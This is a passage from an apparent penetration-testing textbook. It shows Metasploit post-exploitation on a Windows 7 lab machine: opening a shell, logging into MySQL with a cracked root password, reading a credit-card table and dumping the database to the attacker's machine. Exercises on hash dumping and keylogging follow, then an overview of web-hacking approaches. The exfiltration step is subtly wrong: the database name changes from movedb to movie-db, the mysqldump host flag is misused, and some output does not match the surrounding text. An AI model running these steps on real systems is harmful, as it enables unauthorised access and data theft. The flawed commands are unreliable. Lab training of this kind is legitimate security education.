
arise.com/post/2018/11/26/metasploit-basics-part-21-post-exploitation-with-mimikatz.

## Scanning the Internal Network

Very often, the ultimate target of our attack is different from the system we compromised. The ultimate target may be another system on the network, such as the database or domain controller on the same network. Now that we have a foothold inside the network, we may be able to leverage that foothold to compromise the entire network!

The first step to compromising other systems on the network is to scan to see what is available on the network. Ultimately, we want to pivot from the compromised system to other computers and devices on the same network.

To find out what other systems are on the network, the meterpreter has a post-exploitation command, arp scanner. Address Resolution Protocol is used to map MAC addresses to IP addresses on the LAN.

This tool emulates this process to get the systems on the network to give up their IP and MAC addresses.

Now we know each of the systems on the network!

```
meterpreter > shell
Process 340 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>mysql -u root -p
Enter password: ****
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1
Server version: 5.1.70-community MySQL Community Server (GPL)

Copyright (c) 2000, 2013, Oracle and/or its affiliates.  All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help.  Type '\c' to clear the current input statement.
```

### Post Exploitation of MySQL

In Chapter 8, we used a brute-force password-cracking tool on the MySQL database on a Windows 7 target. We easily recovered the password because the administrator had used a weak one. Now that we have the password, what can we do in post-exploitation?

**Connect to the Database**
The first step is to connect to the MySQL database on the Windows 7 system using the password we cracked in Chapter 8.

**Drop into a Shell**
First, we need to drop into a Windows shell from the meterpreter.

`meterpreter>shell`

Then we need to connect to MySQL.

`C:\Windows\system32> mysql -u root -p`

You will be prompted for a password. Type the password from Chapter 8 and hit ENTER.

We will now get a mysql prompt.

`mysql>`

Next, we request MySQL to show us all its databases.

`mysql > show databases;`

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| movedb             |
| mysql              |
| test               |
+--------------------+
4 rows in set (0.19 sec)
mysql> use movedb;
Database changed
mysql>
```

As you can see, there is a database that looks interesting named “movedb.” That’s the one we created on the Windows 7 system with the script from Chapter 4.

Next we need to direct the MySQL database system that we want to use that database (movedb).

`mysql > use movedb`

We can then show the tables within that database.

`mysql > show tables;`

To view all the data from the table creditcards, we can enter:
`mysql > SELECT * FROM creditcards;`

If the amount of data is too large to take a picture of and copy to a piece of paper, we can dump the entire database to our Kali system. First, we need to quit mysql and go to a command prompt.

`mysql > quit`

`C:\`

Now, from the command, we can invoke the mysqldump command that is used to create database backups and direct its output to our remote system:
`mysqldump -u root -p -h 192.168.1.103 movie-db > backup.sql`

### Summary

After exploiting the target, the attacker usually wants to do **something** on the system. This is often referred to as post-exploitation. Using Metasploit, we have numerous options with Metasploit commands and post-exploitation modules that enable us to:

1. Extract password hashes
2. Snap or stream the webcam
3. Activate and record from the microphone
4. Scan the network
5. Keylog all the keystrokes of the target

On the MySQL database, because the administrator had used a weak password, we are able to extract or dump all the data in the database to our remote system.

### Exercises

- 1. Search for all the post-exploitation modules in Metasploit.
- 2. Search for all the Windows post-exploitation modules in Metasploit.
- 3. Exploit a Windows 7 system and get the meterpreter prompt.
- 4. Use the hashdump command to capture hashes and download to your Kali.
- 5. Migrate the meterpreter to process the target is using and capture their keystrokes.
- 6. Connect and login to the mysql database with the password you found in Chapter 8 and dump the database.

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_422_0.png)

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_422_1.png)

## 1.2 Web Hacking

> *If a service is free, you are not the customer. You are the product.*
>
> *Master OTW*

**The Internet and the World Wide Web (www) have made so many wonderful things possible in their brief lifetimes. The list of things wonderful things could go on for pages, but probably most significant is the development of e-commerce and social networking. These two applications have changed our lives in profound ways. Yet, with all these benefits, there has come a dark side.**

All of this traffic is susceptible to interception and alteration.

Before we begin this chapter, please note the title of this chapter is “Web Hacking.” Unlike many books on hacking and penetration testing, it is not “Web App Hacking.” The reason is that there are **innumerable** ways to hack Web traffic and not all of them are attacking the web application or web app.

To begin this chapter, let’s begin by thinking strategically about web hacking. There are many strategies for hacking web traffic, and rather than focus on just one, let’s look at the range of possibilities and then focus on just a few. A single chapter in a book about hacking can barely scratch the surface, so instead, we will focus on strategy and a few examples.

If you are new to web technologies or need to brush up on the fundamentals, take a look at my article on Hackers-Arise covering the basics of web technologies at https://www.hackers-arise.com/single-post/2018/07/22/Web-App-Hacking-Web-Application-Technologies-Part-1.

### Approaches to Web Hacking

Although there are hundreds of ways of hacking the web, they can be grouped into eight basic types.

### 1. Hacking Client Side Controls

One of the most popular areas of web hacking is attacking the client-side controls.

### 2. Hacking Authentication

Hacking authentication can include bypassing authentication such as capturing tokens and replaying them, client-side piggybacking, cross-site request forgery, and of course, cracking usernames and passwords (see the section below on harvesting usernames from WordPress sites and brute-forcing their passwords).

### 3. Hacking Session Management

Session management enables an application to identify a user across multiple requests uniquely.

When a user logs in, session management enables the user to interact with the Web app without having to reauthenticate for every request. Due to its key role, if we can break the application's session management, we can bypass the authentication. In this way, we won't need to crack the username and password to gain access.

### 4. Hacking Access Controls & Authorization

In this area, the hacker fingerprints access control lists (ACL) and attacks the ACLs in ways that will allow a hacker to violate the ACLs.

### 5. Hacking Back End Components

Hacking back end components includes SQL injection with tools such as sqlmap (see the section below on SQL injection), but also includes attacks and injection against XPATH and LDAP.

### 6. Hacking the User

Hacking the user is one of my favorite Web hacks.
Technically, it’s not Web hacking, as we are hacking the end-user, not the Web app, by getting them to travel to our website and load malware to their browser and potentially their system. These techniques include cross-site scripting (XSS), cross-site request forgery, attacking the browser, and violations of the same-origin policy.

### 7. Hacking the Web Application Management

In many cases, Web applications have a management console or other management interface. If we can access that console or interface, we can conceivably change everything about the website, including defacing it.

### 8. Hacking the Web Server

In some cases, we can hack the underlying server of the Web applications, such as Microsoft’s Internet Information Server (IIS), the Apache Project’s Apache server, or nginx. If we can gain control and access to the underlying server, it may give us an entry point to the Web applications.

### 1. Injection

**Website Vulnerabilities According to the Open Web App Security Project (OWASP), the following are the ten most important Web app vulnerabilities in 2019:**
